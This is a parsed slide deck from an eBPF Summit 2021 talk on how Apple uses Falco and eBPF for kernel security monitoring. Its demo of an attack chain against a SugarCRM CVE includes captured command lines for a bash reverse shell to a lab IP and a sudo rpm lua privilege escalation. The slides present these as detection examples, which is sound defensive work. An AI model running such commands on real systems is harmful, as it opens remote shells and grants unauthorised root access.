---
type: source
source-type: paper
title: "Think_eBPF_for_Kernel_Security_Monitoring_-_Falco_at_Apple"
path: papers/Think_eBPF_for_Kernel_Security_Monitoring_-_Falco_at_Apple.pdf
source-md5: d12429e52ce80a5885f0d9c5522014fd
size: 8850 KB
category: paper
ingested: 2026-06-04
tool: liteparse
liteparse-version: 2.0.5
created: 2026-06-04
tags: []

---

# Think_eBPF_for_Kernel_Security_Monitoring_-_Falco_at_Apple

> Ingested from `papers/Think_eBPF_for_Kernel_Security_Monitoring_-_Falco_at_Apple.pdf` via `lit parse` on 2026-06-04.
> Source file: 8.64 MB.

## Page 1

Think eBPF for Kernel Security
Monitoring - Falco at Apple


    Eric Sage & Melissa Kilby
    Linux Kernel & Security Engineering at Apple


    eBPF Summit 2021
    Aug 18 - 19

## Page 2

  The Linux Kernel at Apple
  Why we ❤ BPF





eBPF Summit 2021 - Falco at Apple

## Page 3

   Why we ❤ BPF

   Easy to audit and greatly reduces the impact of bugs and vulnerabilities
   compared to kernel modules.








   Kernel Module has full access     BPF program has limited access
   to the kernel and hardware.       to the kernel.


   Kernel                            Kernel

       BPF Virtual Machine

   Kernel Module    BPF Program


eBPF Summit 2021 - Falco at Apple

## Page 4

   Why we ❤ BPF

   Removes dependencies on external frameworks and kitchen sink modules.



 Kernel Bypass    Pick what you need.
       XDP

       Big Module  Socket Filter
       Probe
   falco
       .ko        Tracepoint


eBPF Summit 2021 - Falco at Apple

## Page 5

   Why we ❤ BPF

   Viewed, analyzed, and debugged using a common set of kernel features and
   tools built on top of libbpf.

       bpftool        {         •  Program Instructions
       libbpf                   •  Map Contents
                                •  Usage Statistics

       Kernel

       BPF Virtual Machine

       BPF Program


eBPF Summit 2021 - Falco at Apple

## Page 6

   Why we ❤  BPF

   Compatibility between kernel versions using CO-RE aids testing and reduces
   deployment footprint
       .


   BPF
   + BTF







             Run Anywhere!



             Kernel Version 1  Kernel Version 2  Kernel Version 3  Kernel Version 4






eBPF Summit 2021 - Falco at Apple

## Page 7

  Why we ❤ BPF




  Kernel Native!










eBPF Summit 2021 - Falco at Apple

## Page 8

High-Value System Calls for Security Monitoring



                                  accept
                                  bpf
                                  capset
                                  connect
                                  dup
                                  execve
                                  fchmodat, fchmod, chmod
    Falco Rules:                  listen
Cost-effective single             mkdirat, mkdir
                                  open,  openat, creat
  event monitoring                ptrace,
                                  rename, renameat
                                  rmdir,  unlink, unlinkat
                                  sendto, sendmsg
                                  setns
                                  setuid
                                  socket
                                  symlink, symlinkat
                                  unshare

 eBPF Summit 2021 - Falco at Apple

## Page 9

  Upload payload over LFI










eBPF Summit 2021 - Falco at Apple    CVE-2020-7472 (SugarCRM)

## Page 10

Remote Code Execution over Reverse Shell










  eBPF Summit 2021 - Falco at Apple    CVE-2020-7472 (SugarCRM)

## Page 11

Privilege Escalation due to Misconfiguration










  eBPF Summit 2021 - Falco at Apple    CVE-2020-7472 (SugarCRM)

## Page 12

                  pid: 1016
   Local File     evt_type: open
                  cmdline: apache2 -DFOREGROUND
   Include        fd_name: /var/www/html/upload/
                  tmp_logo_company_upload/payload.txt
                  user_name: www-data










                  OPEN
                  “Arbitrary File Read”




   apache2 process




eBPF Summit 2021 - Falco at Apple

## Page 13

  Local File Include    Payload



  pid: 1016                         pid: 14749        pid: 14750
  evt_type: chmod, open             evt_type: execve, open        evt_type: execve, open, connect
  cmdline: apache2 -DFOREGROUND     cmdline: sh -c /bin/bash -c 'sh -i >&    cmdline: bash -c sh -i >& /dev/tcp/
                                    /dev/tcp/192.168.13.37/1337 0>&1’        192.168.13.37/1337 0>&1
  “Set Setuid or Setgid bit”
  “Local File Include"              “Run shell untrusted”










eBPF Summit 2021 - Falco at Apple

## Page 14

                       pid: 14751
   Network Connect     evt_type: dup, connect, execve, open
                       cmdline: sh -i
   Event               fd_name:
                       172.18.0.3:50166->192.168.13.37:1337
                       user_name: www-data










                       REVERSE SHELL
                       “Redirect STDOUT/STDIN to Network”
                       “System procs network activity”



   sh process /bin/dash




eBPF Summit 2021 - Falco at Apple

## Page 15

                  pid: 14767
   Privilege      evt_type: connect, execve, open
                  cmdline: sudo rpm --eval %
   Escalation     {lua:os.execute("/bin/sh")}
                  user_name: daemon, www-data, root










                  NO PASSW - ROOT


   sudo process /bin/dash




eBPF Summit 2021 - Falco at Apple

## Page 16

  Sub Process Tree





  systemd

  containerd

  containerd-shim

  init.sh

  apachectl      whoami

                 date

  apache2        ps    whoami


                                         id

  bash  bash    sh    sudo               hostname

                       rpm    sh  sh     ssh






eBPF Summit 2021 - Falco at Apple

## Page 17

  Falco BPFs (sys
      _enter,    sys
      _exit,     sched
      _process
      _exit     …)










  tail bpf calls










  BPFs defined in falcosecurity/libs/blob/master/driver/bpf/probe.c
eBPF Summit 2021 - Falco at Apple    Tail BPFs defined in falcosecurity/libs/blob/master/driver/bpf/fillers.h

## Page 18

Metrics - bpftool “bpftime” vs CPU

    1000 ns    3000 ns




    average time









    1000 ns    3000 ns










    sysctl kernel.bpf_stats_enabled=1
    /usr/bin/bpftool --json --pretty prog show

 eBPF Summit 2021 - Falco at Apple        https://www.mankier.com/8/bpftool-prog

## Page 19

    Internal Production Pipeline


    1
     libs src

     patch & publish “.tar.gz”  2 driver eBPF

 pre-build Falco probes for all
internal kernels and publish “.o”
        Custom     Falco
        Deployment
    3        3a
        Falco release        Custom Falco rules

Patch, package and publish
     userspace binary





    Falco libs src repo falcosecurity/libs/
 eBPF Summit 2021 - Falco at Apple    Falco repo falcosecurity/falco/

## Page 20

    Tips:  Internal     Production   Pipeline Tip: Simple bash script looping over
                                             internal kernels instead of driverkit,
    1                                               set custom PROBE_VERSION
           libs src        Tip: clang-9, clang-11 etc
               2        for older and newer kernels    make LLC=/usr/bin/llc-11 CLANG=/usr/bin/
        patch & publish “.tar.gz”                             clang-11 CC=/usr/bin/gcc-11
               driver eBPF                                   KERNELDIR=$KERNELDIR -B -C $
                                                            {tmp_dir}/libs/build/driver/bpf


pre-build Falco probes for all internal
       kernels and publish “.o”
        3
               Falco release    Tip: Carefully profile deployment
                                  and optimize using bpftool in
                                 addition to CPU & memory usage
Patch, package and publish userspace      3a
               binary        Custom Falco rules

 Tip: Extend falcosecurity/falco-builder
container to build with bundled deps, set  Tip: Can use crictl for
      FALCOSECURITY_LIBS_VERSION ==        container engine testing    Tip: Watch data volume when
    PROBE_VERSION and version release      with containerd        enabling more verbose Falco
  over custom git tags and modify CMake        rules
               libs link …

               Falco libs src repo falcosecurity/libs/
  eBPF Summit 2021 - Falco at Apple        Falco repo falcosecurity/falco/

## Page 21

   Falco - Kernel Security Monitoring at Scale



   Production Readiness & Metrics




   Cost-Effectiveness




   Insight & Detection


eBPF Summit 2021 - Falco at Apple

## Page 22

  Thank you










eBPF Summit 2021 - Falco at Apple

## Page 23

TM and © 2021 Apple Inc. All rights reserved.

## Related pages

- [[linux-ebpf-fundamentals]]

## Source

- Local path: `[[papers/Think_eBPF_for_Kernel_Security_Monitoring_-_Falco_at_Apple.pdf]]`
